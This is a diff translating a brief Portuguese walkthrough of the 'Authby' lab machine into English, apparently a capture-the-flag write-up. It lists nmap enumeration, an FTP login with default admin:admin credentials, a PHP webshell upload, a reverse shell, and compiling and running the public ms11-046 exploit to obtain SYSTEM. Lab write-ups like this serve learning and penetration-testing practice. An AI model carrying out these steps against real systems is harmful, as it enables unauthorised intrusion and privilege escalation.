@@ -1,15 +1,15 @@
 # Authby
 > ftp admin:admin + ms11-046 (Server 2008)
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-FTP na porta 21 com credenciais padrão.
+FTP on port 21 with default credentials.
 
-## Exploração
+## Exploitation
 
 ```
 ftp <IP>
@@ -17,17 +17,17 @@ ftp <IP>
 # pass: admin
 ```
 
-Upload de webshell via FTP para diretório web acessível.
+Upload webshell via FTP to an accessible web directory.
 
 ```
 put shell.php
 ```
 
-Execução de comando via browser → reverse shell.
+Command execution via browser → reverse shell.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-Windows Server 2008 identificado. Exploit `ms11-046`:
+Windows Server 2008 identified. Exploit `ms11-046`:
 
 ```
 searchsploit ms11-046
@@ -41,4 +41,4 @@ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
 exploit.exe
 ```
 
-SYSTEM obtido.
+SYSTEM obtained.
